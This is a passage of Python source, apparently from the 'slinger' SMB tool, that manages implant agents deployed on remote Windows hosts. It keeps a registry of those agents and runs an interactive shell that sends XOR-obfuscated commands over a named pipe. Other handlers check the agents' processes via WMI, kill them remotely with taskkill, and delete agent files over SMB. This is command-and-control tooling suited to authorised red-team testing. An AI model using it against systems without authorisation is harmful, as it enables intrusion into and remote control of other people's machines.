            registry_file = agents_dir / "deployed_agents.json"

            # Load existing registry
            if registry_file.exists():
                with open(registry_file, "r") as f:
                    registry = json.load(f)
            else:
                registry = {}

            # Add new agent
            registry[agent_info["id"]] = agent_info

            # Save updated registry
            with open(registry_file, "w") as f:
                json.dump(registry, f, indent=2)

            print_debug(f"Saved agent info to {registry_file}")

        except Exception as e:
            print_debug(f"Failed to save agent info: {e}")

    def _load_agent_registry(self):
        """Load deployed agents registry"""
        try:
            import json
            from pathlib import Path

            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if registry_file.exists():
                with open(registry_file, "r") as f:
                    return json.load(f)
            return {}

        except Exception as e:
            print_debug(f"Failed to load agent registry: {e}")
            return {}

    def agent_list_handler(self, args):
        """Handle agent list command"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_log,
                print_debug,
            )
            from tabulate import tabulate

            # Handle delete operation if --del specified
            if hasattr(args, "delete_agent") and args.delete_agent:
                if args.delete_agent.lower() == "all":
                    return self._delete_all_agents_from_registry()
                return self._delete_agent_from_registry(args.delete_agent)

            registry = self._load_agent_registry()

            if not registry:
                print_info("No deployed agents found")
                print_info("Use 'agent deploy' to deploy an agent")
                return

            # Filter by host if specified
            filtered_agents = registry
            if hasattr(args, "host") and args.host:
                filtered_agents = {k: v for k, v in registry.items() if v.get("host") == args.host}

            if not filtered_agents:
                print_info(f"No agents found for host: {args.host}")
                return

            # Prepare table data
            headers = ["Agent ID", "Host", "Agent Name", "Path", "PPID", "Status", "Deployed At"]
            table_data = []

            for agent_id, info in filtered_agents.items():
                ppid = info.get("process_id", "Unknown")
                table_data.append(
                    [
                        agent_id,
                        info.get("host", "Unknown"),
                        info.get("name", "Unknown"),
                        info.get("path", "Unknown"),
                        ppid,
                        info.get("status", "Unknown"),
                        info.get("deployed_at", "Unknown")[:19],  # Trim timestamp
                    ]
                )

            print_info(f"Deployed Agents ({len(filtered_agents)} found):")
            print_log(tabulate(table_data, headers=headers, tablefmt="grid"))

            print_info("\nCommands:")
            print_log("  agent use <id>           - Interact with agent")
            print_log("  agent list --host <host> - Filter by host")
            print_log("  agent list --del <id>    - Remove agent from registry")
            print_log("  agent list --del all     - Remove all agents from registry")

        except Exception as e:
            print_bad(f"Failed to list agents: {e}")
            print_debug(f"Exception details: {e}")

    def agent_use_handler(self, args):
        """Handle agent interaction via named pipe"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
                print_debug,
            )
            import time

            # Load agent registry to get agent info
            registry = self._load_agent_registry()
            agent_info = registry.get(args.agent_id)

            if not agent_info:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                print_info("Use 'agent list' to see deployed agents")
                return

            print_info(f"Agent Information:")
            print_log(f"  ID: {agent_info['id']}")
            print_log(f"  Host: {agent_info['host']}")
            print_log(f"  Name: {agent_info['name']}")
            print_log(f"  Path: {agent_info['path']}")
            print_log(f"  Pipe: \\\\{agent_info['host']}\\pipe\\{agent_info['pipe_name']}")
            if agent_info.get("process_id"):
                print_log(f"  PPID: {agent_info['process_id']} (parent process)")
            else:
                print_log(f"  PPID: Unknown")

            print_info(f"Connecting to agent: {args.agent_id}")
            print_info(f"Timeout: {args.timeout} seconds")

            # Check if we're connected to the same host
            if self.host != agent_info["host"]:
                print_warning(f"Current session is connected to {self.host}")
                print_warning(f"Agent is on {agent_info['host']}")
                print_info("You may need to connect to the agent's host first")

            # Start interactive agent shell
            print_good(f"Starting interactive session with agent {args.agent_id}")
            print_info(f"Pipe Name: {agent_info['pipe_name']}")
            self._start_agent_shell(agent_info, args.timeout)

        except Exception as e:
            print_bad(f"Agent interaction failed: {e}")
            print_debug(f"Exception details: {e}")

    def agent_rename_handler(self, args):
        """Handle agent renaming in registry"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad
            import json
            from pathlib import Path

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if old agent exists
            if args.old not in agents:
                print_bad(f"Agent '{args.old}' not found in registry")
                return

            # Check if new name already exists
            if args.new in agents:
                print_bad(f"Agent '{args.new}' already exists in registry")
                return

            # Rename the agent
            agents[args.new] = agents[args.old]
            agents[args.new]["id"] = args.new
            del agents[args.old]

            # Save updated registry
            with open(registry_file, "w") as f:
                json.dump(agents, f, indent=2)

            print_good(f"Agent renamed from '{args.old}' to '{args.new}'")

        except Exception as e:
            print_bad(f"Failed to rename agent: {e}")

    def agent_check_handler(self, args):
        """Handle agent process status check via WMI"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )
            import json
            from pathlib import Path

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            ppid = agent_info.get("process_id")

            if not ppid:
                print_warning(f"No PPID recorded for agent '{args.agent_id}'")
                return

            print_info(f"Checking agent '{args.agent_id}' (PPID: {ppid})")

            # Use WMI to check if the process and its children exist
            try:
                # Query for child processes of the agent's PPID
                child_query = (
                    f"SELECT ProcessId, Name FROM Win32_Process WHERE ParentProcessId = {ppid}"
                )

                print_debug(f"Executing WMI query: {child_query}")

                # Create temp args for the query
                temp_args = type("Args", (), {})()
                temp_args.method = "query"
                temp_args.query = child_query
                temp_args.namespace = "root/cimv2"
                temp_args.format = "table"
                temp_args.output = None

                # Capture the wmiexec output
                import io
                import sys
                from contextlib import redirect_stdout, redirect_stderr

                output_buffer = io.StringIO()
                error_buffer = io.StringIO()

                with redirect_stdout(output_buffer), redirect_stderr(error_buffer):
                    try:
                        self.wmi_query_handler(temp_args)
                    except Exception as query_error:
                        print_debug(f"WMI query exception: {query_error}")

                stdout_output = output_buffer.getvalue()
                stderr_output = error_buffer.getvalue()

                print_debug(f"WMI stdout ({len(stdout_output)} chars): {repr(stdout_output[:200])}")
                print_debug(f"WMI stderr ({len(stderr_output)} chars): {repr(stderr_output[:200])}")

                # Check for query results - support multiple output formats
                # Pattern 1: "Query returned X result(s)" where X > 0
                # Pattern 2: "=== Record" (older format)
                # Pattern 3: Check for "no results" or "0 result"

                result_count = 0
                agent_alive = False

                # Try to extract result count from output
                import re

                result_match = re.search(r"Query returned (\d+) result", stdout_output)
                if result_match:
                    result_count = int(result_match.group(1))
                    agent_alive = result_count > 0
                elif "=== Record" in stdout_output:
                    result_count = stdout_output.count("=== Record")
                    agent_alive = result_count > 0
                elif "Query returned no results" in stdout_output or "0 results" in stdout_output:
                    agent_alive = False
                    result_count = 0

                if agent_alive:
                    print_good(
                        f"✓ Agent process tree is running (PPID: {ppid}) - found {result_count} child process(es)"
                    )

                    # Update agent status to alive if it was previously marked as dead
                    if agents[args.agent_id].get("status") == "dead":
                        agents[args.agent_id]["status"] = "alive"
                        with open(registry_file, "w") as f:
                            json.dump(agents, f, indent=2)
                        print_info(f"Agent '{args.agent_id}' status updated to 'alive'")

                elif result_count == 0:
                    print_bad(f"✗ Agent process not found (PPID: {ppid})")
                    print_warning(f"Process has terminated - updating status to 'dead'")

                    # Update agent status to dead
                    agents[args.agent_id]["status"] = "dead"
                    with open(registry_file, "w") as f:
                        json.dump(agents, f, indent=2)

                    print_good(f"✓ Agent '{args.agent_id}' marked as dead in registry")
                else:
                    print_warning(f"Unable to determine agent status from WMI output")
                    print_debug(f"Could not parse WMI results - agent status unchanged")
                    # Show what we actually got for debugging
                    if stdout_output:
                        print_debug(f"Raw output: {stdout_output}")

            except Exception as e:
                print_bad(f"WMI query failed: {e}")
                print_debug(f"Exception details: {e}")
                print_info("Unable to verify agent status")

        except Exception as e:
            print_bad(f"Failed to check agent: {e}")

    def agent_kill_handler(self, args):
        """Handle agent process termination via WMI and taskkill"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )
            import json
            from pathlib import Path

            # Check if share is connected
            if not self.check_if_connected():
                return

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            agent_path = agent_info.get("path")

            if not agent_path:
                print_warning(f"No path recorded for agent '{args.agent_id}'")
                return

            # Extract just the executable name from the path
            # Handle Windows paths properly even on Linux
            if "\\" in agent_path:
                exe_name = agent_path.split("\\")[-1]
            else:
                import os

                exe_name = os.path.basename(agent_path)

            print_info(f"Looking for agent process: {exe_name}")

            # Use WMI to find the process by executable name
            try:
                # Query for processes matching the agent's executable name (not full path)
                process_query = (
                    f"SELECT ProcessId, Name FROM Win32_Process WHERE Name = '{exe_name}'"
                )

                print_debug(f"Executing WMI query: {process_query}")

                # Use existing WMI infrastructure
                process_ids = []
                try:
                    # Force fresh WMI connection (max_retries=0 skips cache)
                    # This is needed because pipe operations may corrupt cached connections
                    if hasattr(self, "_wmi_services"):
                        self._wmi_services.pop("root/cimv2", None)

                    iWbemServices = self.setup_wmi(namespace="root/cimv2", operation_type="query")

                    # Execute query
                    iEnumWbemClassObject = iWbemServices.ExecQuery(process_query)

                    # Parse results using the correct enumeration method
                    while True:
                        try:
                            pEnum = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                            properties = pEnum.getProperties()

                            # Extract ProcessId from properties
                            if "ProcessId" in properties:
                                pid = properties["ProcessId"]["value"]
                                if pid:
                                    process_ids.append(pid)
                        except Exception:
                            # No more results
                            break

                except Exception as query_error:
                    print_bad(f"WMI query failed: {query_error}")
                    print_debug(f"Query error details: {query_error}")
                    return

                if not process_ids:
                    print_warning(f"No running processes found for agent '{args.agent_id}'")
                    print_info("Agent may already be terminated")
                    return

                print_good(f"Found {len(process_ids)} process(es): {process_ids}")

                # Kill each found process using taskkill via WMI DCOM
                for pid in process_ids:
                    print_info(f"Terminating process {pid}...")

                    try:
                        # Use existing execute_wmi_command method
                        kill_command = f"taskkill /F /PID {pid}"

                        result = self.execute_wmi_command(
                            command=kill_command, capture_output=True, timeout=10, shell="cmd"
                        )

                        if result.get("success"):
                            output = result.get("output", "")
                            print_debug(f"Taskkill output: {output}")

                            if "SUCCESS" in output.upper() or "terminated" in output.lower():
                                print_good(f"✓ Successfully terminated process {pid}")
                            else:
                                print_warning(f"Process {pid} termination status: {output.strip()}")
                        else:
                            print_bad(f"Failed to terminate process {pid}")
                            print_debug(f"Error: {result.get('error')}")

                    except Exception as kill_error:
                        print_bad(f"Failed to terminate process {pid}: {kill_error}")
                        print_debug(f"Kill error details: {kill_error}")

                # Update agent status to dead
                agents[args.agent_id]["status"] = "dead"
                with open(registry_file, "w") as f:
                    json.dump(agents, f, indent=2)

                print_info(f"Agent '{args.agent_id}' status updated to 'dead'")

            except Exception as e:
                print_bad(f"Failed to kill agent process: {e}")
                print_debug(f"Exception details: {e}")

        except Exception as e:
            print_bad(f"Failed to kill agent: {e}")

    def agent_rm_handler(self, args):
        """Handle agent file removal and registry update"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_debug,
            )
            import json
            from pathlib import Path

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            agent_path = agent_info.get("path")

            if not agent_path:
                print_warning(f"No path recorded for agent '{args.agent_id}'")
                return

            print_info(f"Attempting to delete agent file: {agent_path}")

            # Use SMB to delete the remote file
            try:
                # Extract relative path and filename
                path_parts = agent_path.replace("\\", "/").split("/")
                filename = path_parts[-1]

                # Try to delete the file via SMB
                try:
                    # Use existing SMB connection
                    self.conn.deleteFile(
                        self.share, agent_path.replace("c:\\", "").replace("\\", "/")
                    )
                    print_good(f"Successfully deleted agent file: {agent_path}")
                    deletion_success = True
                except Exception as smb_error:
                    print_warning(f"Failed to delete file via SMB: {smb_error}")
                    print_debug(f"SMB deletion error: {smb_error}")
                    deletion_success = False

                # Update agent status regardless of file deletion success
                if deletion_success:
                    agents[args.agent_id]["status"] = "deleted"
                    print_good(f"Agent '{args.agent_id}' status updated to 'deleted'")
                else:
                    print_warning(f"File deletion failed, but agent can be manually removed")
                    print_info(f"Agent '{args.agent_id}' remains in registry for manual cleanup")

                # Save registry
                with open(registry_file, "w") as f:
                    json.dump(agents, f, indent=2)

            except Exception as e:
                print_bad(f"Failed to delete agent file: {e}")
                print_debug(f"Exception details: {e}")

        except Exception as e:
            print_bad(f"Failed to remove agent: {e}")

    def agent_update_handler(self, args):
        """Handle agent path update in registry"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_warning
            import json
            from pathlib import Path

            # Load agent registry
            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_file.exists():
                print_bad("No deployed agents found")
                return

            with open(registry_file, "r") as f:
                agents = json.load(f)

            # Check if agent exists
            if args.agent_id not in agents:
                print_bad(f"Agent '{args.agent_id}' not found in registry")
                return

            agent_info = agents[args.agent_id]
            old_path = agent_info.get("path", "Unknown")

            print_info(f"Updating agent '{args.agent_id}' path:")
            print_info(f"  Old path: {old_path}")
            print_info(f"  New path: {args.path}")

            # Update the path
            agents[args.agent_id]["path"] = args.path

            # Save registry
            with open(registry_file, "w") as f:
                json.dump(agents, f, indent=2)

            print_good(f"Agent '{args.agent_id}' path updated successfully")

        except Exception as e:
            print_bad(f"Failed to update agent: {e}")

    def _show_built_agents_status(self, output_dir):
        """Show built agents and their deployment status"""
        try:
            import os
            from pathlib import Path
            from tabulate import tabulate
            from slingerpkg.utils.printlib import print_info, print_log, print_warning, print_debug

            output_path = Path(output_dir)

            if not output_path.exists():
                print_info("\nBuilt Agents: None")
                return

            # Find all .exe files in output directory
            agent_files = list(output_path.glob("*.exe"))

            if not agent_files:
                print_info("\nBuilt Agents: None")
                print_log("  Use 'agent build' to build agents")
                return

            # Load deployment registry
            registry = self._load_agent_registry()

            print_info("\nBuilt Agents:")

            # Prepare table data
            headers = ["Agent File", "Architecture", "Size", "Status", "Deployed To", "Agent ID"]
            table_data = []

            for agent_file in sorted(agent_files):
                # Extract info from filename (e.g., slinger_agent_x64_12345.exe)
                filename = agent_file.name

                # Parse architecture from filename
                if "_x64_" in filename:
                    arch = "x64"
                elif "_x86_" in filename:
                    arch = "x86"
                else:
                    arch = "Unknown"

                # Get file size
                try:
                    size = self.sizeof_fmt(agent_file.stat().st_size)
                except:
                    size = "Unknown"

                # Check deployment status
                deployed_info = self._find_deployed_agent_by_file(registry, filename)

                if deployed_info:
                    status = "Deployed"
                    deployed_to = f"{deployed_info['host']}:{deployed_info['path']}"
                    agent_id = deployed_info["id"]
                else:
                    status = "Not Deployed"
                    deployed_to = "-"
                    agent_id = "-"

                table_data.append([filename, arch, size, status, deployed_to, agent_id])

            print_log(tabulate(table_data, headers=headers, tablefmt="simple"))

            # Show summary
            deployed_count = sum(1 for row in table_data if row[3] == "Deployed")
            total_count = len(table_data)

            print_log(f"\nSummary: {total_count} built, {deployed_count} deployed")

            if deployed_count > 0:
                print_log("Use 'agent list' to see detailed deployment info")
                print_log("Use 'agent use <id>' to interact with deployed agents")

        except Exception as e:
            print_warning(f"Failed to show agent status: {e}")
            print_debug(f"Exception details: {e}")

    def _find_deployed_agent_by_file(self, registry, filename):
        """Find deployed agent info by matching filename patterns"""
        try:
            # Extract base name without .exe
            base_name = filename.replace(".exe", "")

            # Look for agents that might match this file
            for agent_id, info in registry.items():
                agent_name = info.get("name", "")

                # Check if the agent name matches or contains similar patterns
                if agent_name == filename:
                    return info

                # Also check if the agent ID is contained in the filename
                if agent_id in base_name:
                    return info

            return None

        except Exception:
            return None

    @staticmethod
    def _xor_decode(data, key):
        """XOR decode data with the given key (symmetric operation)"""
        if key is None:
            return data
        if isinstance(data, str):
            data = data.encode("utf-8")
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= key
        return bytes(result)

    def _send_pipe_message(self, message_type, data, xor_key=None):
        """Send a structured message to the agent via SMB pipe"""
        try:
            import struct
            import traceback

            print_debug(
                f"_send_pipe_message called: type={hex(message_type)}, data={data[:50] if isinstance(data, (str, bytes)) else data}"
            )

            # Message format: [length:4][type:4][data:N]
            # All integers are little-endian
            data_bytes = data if isinstance(data, bytes) else data.encode("utf-8")

            # XOR encode the data if key is provided (agent expects encoded commands)
            if xor_key is not None:
                data_bytes = self._xor_decode(data_bytes, xor_key)  # XOR is symmetric
                print_debug(f"Data XOR-encoded with key: {xor_key}")

            length = len(data_bytes)
            print_debug(f"Message packed: length={length}, type={hex(message_type)}")

            # Pack header: length and type as little-endian 32-bit integers
            header = struct.pack("<II", length, message_type)
            full_message = header + data_bytes
            print_debug(f"Full message size: {len(full_message)} bytes")

            # Write to the pipe using SMB
            print_debug(f"Calling writeFile: tid={self.agent_pipe_tid}, fid={self.agent_pipe_fid}")
            bytes_written = self.conn.writeFile(
                self.agent_pipe_tid, self.agent_pipe_fid, full_message, 0  # offset
            )
            print_debug(f"writeFile returned: {bytes_written}")

            return True

        except Exception as e:
            print_debug(f"Failed to send pipe message: {e}")
            print_debug(f"Traceback: {traceback.format_exc()}")
            return False

    def _receive_pipe_message(self):
        """Receive a structured message from the agent via SMB pipe"""
        try:
            import struct

            # Read header (8 bytes: length + type as little-endian)
            header_data = self.conn.readFile(
                self.agent_pipe_tid, self.agent_pipe_fid, 0, 8  # offset  # bytesToRead
            )

            if not header_data or len(header_data) != 8:
                return None, None

            # Unpack as little-endian 32-bit integers
            length, msg_type = struct.unpack("<II", header_data)

            # Read message data (raw bytes)
            if length > 0:
                data = self.conn.readFile(
                    self.agent_pipe_tid, self.agent_pipe_fid, 0, length  # offset  # bytesToRead
                )

                if not data or len(data) != length:
                    return None, None

                # Return raw bytes - caller decides how to decode
                return msg_type, data
            else:
                return msg_type, b""

        except Exception as e:
            print_debug(f"Failed to receive pipe message: {e}")
            return None, None

    def _start_agent_shell(self, agent_info, timeout):
        """Start interactive shell with agent via named pipe using custom protocol"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )
            from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
            import time

            # Use the known pipe name from the registry
            pipe_name = agent_info["pipe_name"]
            print_info(f"Connecting to pipe: \\\\{agent_info['host']}\\pipe\\{pipe_name}")

            try:
                # Named pipes MUST be accessed through IPC$ share
                pipe_path = f"\\{pipe_name}"

                # Save current share state to restore later
                saved_share = self.share if hasattr(self, "share") else None
                saved_tid = self.tid if hasattr(self, "tid") else None

                # Connect to IPC$ share for named pipe access
                self.agent_pipe_tid = self.conn.connectTree("IPC$")

                # Open the pipe through SMB using correct impacket API
                self.agent_pipe_fid = self.conn.openFile(
                    self.agent_pipe_tid,
                    pipe_path,
                    desiredAccess=0x12019F,  # GENERIC_READ | GENERIC_WRITE
                    shareMode=0x7,  # FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
                    creationOption=0x00000040,  # FILE_NON_DIRECTORY_FILE
                    creationDisposition=0x00000001,  # FILE_OPEN
                    fileAttributes=0x00000080,  # FILE_ATTRIBUTE_NORMAL
                )

                print_good("Connected to agent pipe")
                print_debug(f"Connected to pipe: {pipe_name}")

                # Handshake with agent
                # Agent sends "OK" automatically (line 267) THEN enters command loop
                # We just read and discard that "OK" - then we're synchronized
                try:
                    xor_key = agent_info.get("xor_key")

                    # Read and discard the "OK" that agent sends on connection
                    msg_type, response_data = self._receive_pipe_message()
                    decoded_data = self._xor_decode(response_data, xor_key)
                    handshake_response = decoded_data.decode("utf-8", errors="replace").strip()
                    print_debug(f"Agent sent auto-handshake (discarded): {handshake_response}")

                    # Now synchronized - agent is in command loop waiting

                except Exception as handshake_error:
                    print_debug(f"Handshake error details: {handshake_error}")
                    import traceback

                    print_debug(f"Traceback: {traceback.format_exc()}")
                    raise

                # Start interactive shell
                self._run_pipe_interactive_shell(agent_info)

            except Exception as e:
                print_bad(f"Failed to connect to agent: {e}")
                print_debug(f"Pipe connection error: {e}")
                print_info("Make sure the agent is running and accessible")
                # Clean up pipe handle if we opened it
                if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                    try:
                        print_debug("Cleaning up pipe handle after error")
                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
                        print_debug("Disconnecting from IPC$ tree after error")
                        self.conn.disconnectTree(self.agent_pipe_tid)
                        delattr(self, "agent_pipe_fid")
                        delattr(self, "agent_pipe_tid")
                    except Exception as cleanup_err:
                        print_debug(f"Cleanup error (non-fatal): {cleanup_err}")
                return

        except Exception as e:
            print_bad(f"Failed to start agent shell: {e}")
            print_debug(f"Exception details: {e}")
            # Clean up pipe handle if we opened it
            if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                try:
                    self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
                except:
                    pass

    def _run_pipe_interactive_shell(self, agent_info):
        """Run interactive shell using custom pipe protocol"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )
            import sys

            print_info("╔══════════════════════════════════════════╗")
            print_info("║        AGENT INTERACTIVE SHELL          ║")
            print_info("╚══════════════════════════════════════════╝")
            print_log(f"Agent ID: {agent_info['id']}")
            print_log(f"Host: {agent_info['host']}")
            print_log(f"Pipe: {agent_info['pipe_name']}")
            print_log("")
            print_info("Type 'exit' to close the connection")
            print_info("Type 'help' for agent commands")
            print_log("")

            try:
                while True:
                    try:
                        # Get user input
                        command = input(f"agent:{agent_info['id']}> ").strip()

                        if not command:
                            continue

                        if command.lower() in ["exit", "quit", "q"]:
                            print_info("Closing agent connection...")
                            break

                        if command.lower() == "help":
                            print_info("Available commands:")
                            print_log("  help        - Show this help")
                            print_log("  exit/quit   - Close connection")
                            print_log("  <command>   - Execute command on agent")
                            continue

                        # Send command to agent via pipe (message type 0x1001 = command)
                        # XOR encode the command before sending
                        xor_key = agent_info.get("xor_key")
                        if not self._send_pipe_message(0x1001, command, xor_key):
                            print_bad("Failed to send command to agent")
                            continue

                        # Receive response from agent
                        msg_type, response_data = self._receive_pipe_message()

                        if msg_type is None:
                            print_warning("No response from agent")
                        elif msg_type == 0x1002:  # Response message type
                            # XOR decode the response using the stored key
                            decoded_data = self._xor_decode(response_data, xor_key)
                            response = decoded_data.decode("utf-8", errors="replace")
                            print_log(response)
                        else:
                            print_warning(f"Unexpected message type: 0x{msg_type:04x}")

                    except KeyboardInterrupt:
                        print_info("\nCtrl+C detected - closing agent connection...")
                        break

                    except EOFError:
                        print_info("\nEOF detected - closing agent connection...")
                        break

            finally:
                # Clean up pipe connection - just close file, don't disconnect tree
                try:
                    if hasattr(self, "agent_pipe_fid") and hasattr(self, "agent_pipe_tid"):
                        print_debug("Closing pipe file handle")
                        self.conn.closeFile(self.agent_pipe_tid, self.agent_pipe_fid)
                        # Don't disconnect IPC$ tree - it can stay connected
                        # Disconnecting may corrupt the SMB connection state
                        # Clear the handles
                        delattr(self, "agent_pipe_fid")
                        delattr(self, "agent_pipe_tid")

                    # Clear cached WMI connections since pipe operations may have affected them
                    if hasattr(self, "_wmi_services"):
                        print_debug("Clearing cached WMI connections after pipe operation")
                        self._wmi_services.clear()

                except Exception as cleanup_err:
                    print_debug(f"Pipe cleanup error: {cleanup_err}")

                print_info("Agent connection closed")

        except Exception as e:
            print_bad(f"Interactive shell error: {e}")
            print_debug(f"Exception details: {e}")

    def _run_dce_interactive_shell(self, agent_info):
        """Run interactive shell using DCE transport"""
        try:
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )
            import sys

            print_info("╔══════════════════════════════════════════╗")
            print_info("║        AGENT INTERACTIVE SHELL          ║")
            print_info("╚══════════════════════════════════════════╝")
            print_log(f"Agent ID: {agent_info['id']}")
            print_log(f"Host: {agent_info['host']}")
            print_log(f"Pipe: {agent_info['pipe_name']}")
            print_log("")
            print_info("Type 'exit' to close the connection")
            print_info("Type 'help' for agent commands")
            print_log("")

            try:
                while True:
                    try:
                        # Get user input
                        command = input(f"agent:{agent_info['id']}> ").strip()

                        if not command:
                            continue

                        if command.lower() in ["exit", "quit", "q"]:
                            print_info("Closing agent connection...")
                            break

                        if command.lower() == "help":
                            print_info("Available commands:")
                            print_log("  help        - Show this help")
                            print_log("  exit/quit   - Close connection")
                            print_log("  <command>   - Execute command on agent")
                            continue

                        # Send command to agent via DCE transport
                        command_data = command.encode("utf-8")

                        try:
                            # Send the command
                            self.dce_transport.send(command_data)

                            # Receive response
                            response_data = self.dce_transport.recv(4096)

                            if response_data:
                                response = response_data.decode("utf-8", errors="replace")
                                print_log(response)
                            else:
                                print_warning("No response from agent")

                        except Exception as send_error:
                            print_bad(f"Communication error: {send_error}")
                            print_debug(f"DCE send/recv error: {send_error}")

                    except KeyboardInterrupt:
                        print_info("\nCtrl+C detected - closing agent connection...")
                        break

                    except EOFError:
                        print_info("\nEOF detected - closing agent connection...")
                        break

            finally:
                # Clean up DCE connection
                try:
                    if hasattr(self.dce_transport, "disconnect"):
                        self.dce_transport.disconnect()
                    elif hasattr(self.dce_transport, "close"):
                        self.dce_transport.close()
                except:
                    pass

                print_info("Agent connection closed")

        except Exception as e:
            print_bad(f"Interactive shell error: {e}")
            print_debug(f"Exception details: {e}")

    def _discover_agent_pipe_name(self, agent_id):
        """Discover actual agent pipe name by scanning IPC$ share"""
        try:
            from slingerpkg.utils.printlib import print_debug

            # Temporarily switch to IPC$ to scan for pipes
            current_share = self.share
            self.conn.connectTree("IPC$")
            self.share = "IPC$"

            try:
                # List IPC$ contents to find pipe names
                files = self.conn.listPath("IPC$", "\\")

                for file_info in files:
                    filename = file_info.get_longname()
                    # Look for slinger related pipes (including custom pipe names)
                    if "slinger" in filename.lower():
                        pipe_name = filename
                        print_debug(f"Found agent pipe: {pipe_name}")
                        return pipe_name

            finally:
                # Restore original share
                if current_share != "IPC$":
                    self.conn.connectTree(current_share)
                    self.share = current_share

            return None

        except Exception as e:
            print_debug(f"Pipe discovery failed: {e}")
            return None

    def _update_agent_pipe_name(self, agent_id, new_pipe_name):
        """Update agent registry with discovered pipe name"""
        try:
            import os
            import json
            from pathlib import Path

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if registry_path.exists():
                with open(registry_path, "r") as f:
                    registry = json.load(f)

                if agent_id in registry:
                    registry[agent_id]["pipe_name"] = new_pipe_name

                    with open(registry_path, "w") as f:
                        json.dump(registry, f, indent=2)

        except Exception as e:
            print_debug(f"Failed to update registry: {e}")

    def _extract_encryption_seed_from_filename(self, filename):
        """Extract encryption seed from agent filename pattern: slinger_agent_x64_12345.exe"""
        try:
            import re

            # Pattern: slinger_agent_{arch}_{seed}.exe
            pattern = r"slinger_agent_(?:x64|x86)_(\d+)\.exe"
            match = re.search(pattern, filename)

            if match:
                return match.group(1)

            return None

        except Exception:
            return None

    def _lookup_build_registry(self, agent_path):
        """Look up agent information from build registry"""
        try:
            import json
            from pathlib import Path

            registry_path = Path.home() / ".slinger" / "builds" / "built_agents.json"
            if not registry_path.exists():
                return None

            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Look up by absolute path
            abs_path = str(Path(agent_path).resolve())
            return registry.get(abs_path)

        except Exception:
            return None

    def _delete_agent_from_registry(self, agent_id):
        """Delete agent from registry by ID"""
        try:
            import os
            import json
            from pathlib import Path
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_path.exists():
                print_bad("No agent registry found")
                return

            # Load current registry
            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Check if agent exists
            if agent_id not in registry:
                print_bad(f"Agent '{agent_id}' not found in registry")
                print_info("Use 'agent list' to see available agents")
                return

            # Get agent info for confirmation
            agent_info = registry[agent_id]
            print_info(f"Agent to delete:")
            print_log(f"  ID: {agent_info['id']}")
            print_log(f"  Host: {agent_info['host']}")
            print_log(f"  Name: {agent_info['name']}")
            print_log(f"  Path: {agent_info['path']}")
            if agent_info.get("process_id"):
                print_log(f"  PID: {agent_info['process_id']}")

            # Confirm deletion
            try:
                confirm = (
                    input(f"\nDelete agent '{agent_id}' from registry? [y/N]: ").strip().lower()
                )
                if confirm not in ["y", "yes"]:
                    print_info("Deletion cancelled")
                    return
            except (KeyboardInterrupt, EOFError):
                print_info("\nDeletion cancelled")
                return

            # Remove agent from registry
            del registry[agent_id]

            # Save updated registry
            with open(registry_path, "w") as f:
                json.dump(registry, f, indent=2)

            print_good(f"✓ Agent '{agent_id}' removed from registry")
            print_warning("Note: This only removes the registry entry.")
            print_warning("The actual agent process may still be running.")
            if agent_info.get("process_id"):
                print_info(f"To kill the process, use: taskkill /F /PID {agent_info['process_id']}")

        except Exception as e:
            print_bad(f"Failed to delete agent: {e}")

    def _delete_all_agents_from_registry(self):
        """Delete all agents from registry"""
        try:
            import os
            import json
            from pathlib import Path
